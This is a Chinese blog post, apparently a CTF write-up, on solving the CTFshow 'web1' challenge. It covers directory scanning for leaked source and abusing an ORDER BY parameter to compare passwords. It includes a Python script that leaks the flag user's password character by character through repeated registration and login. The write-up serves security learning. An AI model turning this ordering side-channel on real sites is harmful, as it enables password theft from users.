---
title: CTFshow web1
swiper_index: 5
categories:
    -网络安全
tags:
  - php
  - 代码审计
  - ctfshow
abbrlink: 22275
date: 2022-12-04 22:30:00
updated: 2022-12-04 22:30:00
---

# 日刷 - CTFshow web1
打开首页
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-1.png)

既然能注册那就注册一个试试
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-2.png)

登陆后看到提示，flag藏在flag用户的密码中，把order=id修改成order=nickname，排序发生变化，猜测使用数据库使用order by进行排序，可能是个突破口
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-3.png)

burp抓个包看看，没发现什么可疑的参数，回到首页尝试注入看看，输入union发现错误提示
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-4.png)

fuzz测试，能用的基本都过滤了，不管怎么测都只是响应error，思绪回到开头，F12无果，尝试着目录扫描，找到疑似源码的文件，下载来看看
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-5.png)
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-6.png)

代码审计，貌似没有注入的可能，查看信息显示页面，这里数据库能把所有的字段进行order by排序
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-7.png)
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-8.png)

这里可以利用?order=pwd判断我们的密码与flag用户的密码大小，当按照pwd排序时，比如flag用户密码为flag{123},注册密码为e时，出现在上面，注册密码为g时，出现在下面，这样就能判断第一个密码为f，以此累加，有点像bool注入
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-9.png)
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-10.png)



```
# 借鉴大佬的脚本试着写了下
import requests

url = "http://581f799b-2e2a-4e97-9cc2-2d73a8fc9b61.challenge.ctf.show/"
url1 = url + "/reg.php"  # 注册页面
url2 = url + "/login.php"  # 登录界面
url3 = url + "/user_main.php?order=pwd"  # 查询界面
s = requests.session()

flag = "ctfshow{"
str_list = "-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~"  #

for i in range(0, 45):
    print("----------")
    for j in str_list:

        test_pwd = ""
        test_pwd = flag + j
        real_pwd = flag + chr(ord(j) - 1)
        data = {'username': test_pwd,
                'email': 'c',
                'nickname': 'c',
                'password': test_pwd
                }

        # 因为存在flag用户所以当我们注册的用户名为flag，密码为flag时，可以注册成功，但是无法用我们注册的密码登录。所以中间加了个判断
        if (test_pwd == 'flag'):
            flag = 'flag'
            print(flag)
            break

        r1 = s.post(url1, data)
        r2 = s.post(url2, data)
        r3 = s.get(url3)
        t = r3.text

        if (t.index("<td>" + test_pwd + "</td>") > t.index("<td>flag@ctf.show</td>")):
            flag = real_pwd
            print(flag)
            break

```
{% tip warning faa-horizontal animated-hover %}如果最初的flag=''的话，爆破到ctfsho的时候就会出问题，因为or被过滤了{% endtip %}
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-11.png)

{% tip success faa-horizontal animated-hover %}这里因为已经提前知道了flag的结构为ctfshow{}，flag='ctfshow{' 就好了，成功拿到{% endtip %}
![code](https://bugcarrot-blog.oss-cn-beijing.aliyuncs.com/articles/cfsweb1-12.png)

